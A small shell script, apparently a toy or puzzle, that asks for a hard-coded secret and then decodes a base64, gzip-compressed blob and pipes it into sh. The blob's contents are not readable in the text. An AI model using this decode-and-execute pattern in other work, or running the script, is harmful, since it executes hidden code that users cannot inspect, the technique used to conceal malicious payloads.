#!/bin/sh

_SECRET=bybcURxJaaj5ZW9G2aYNjuYjqMg6GbCm
_MYCODE=H4sICBV55FYAA3QAZVDLToNAFN3PVxynEoYEmGAk0bYseNQlJaZLN5RXScpAeFSM+u8OJW01bu6955z7XtzxfSl4dyDEddTFFSUp+ClueV81RCWeoxZJAuMdxihdjR4G1uvN9kWKvqOWokcVl4Kd6jLVPiNGle5NUH2nrSLm6uHkPJ3JNI2F2oT8GbX1INIz9U2mbibvV20FI4eMVBLIldIsL0WGiI36h4amlWX5OSYXKQSzHmzzyeaPlvls34QAVEnlHldiB/o6TSxFAW8osBnjqjlmtwQXNK2H/TFbAlAsM/9d7YFOhyZx1y/xt7EPOp+i4SKphGTJoQa9d6k03mR8+p8LZgFfkG//AUqWIIuPAQAA

case $1 in
	--help|help) echo "Usage: $0 (--help | --check)
--help  : This help screen
--check : perform sha256 checksum on embedded mycode script, so you can check based on original
--secret : this is the default option
"
			exit 1;;
	--check|check) echo "Checking sha256 checksum"
			echo "$_MYCODE" | base64 -d | zcat | sha256sum
			exit 0
			;;
esac

echo -n Type the secret: 
read SECRET

if [ "x$_SECRET" != "x$SECRET" ] ; then
	tput setaf 1
	tput bold
	echo "ERROR!! You don't know the SECRET!"
	tput sgr0
	exit 1
fi

tput setaf 2
echo "YAY! You got the secret!"
tput setaf 4
tput bold
echo "Running special code!"
tput sgr0
echo "$_MYCODE" | base64 -d | zcat | sh
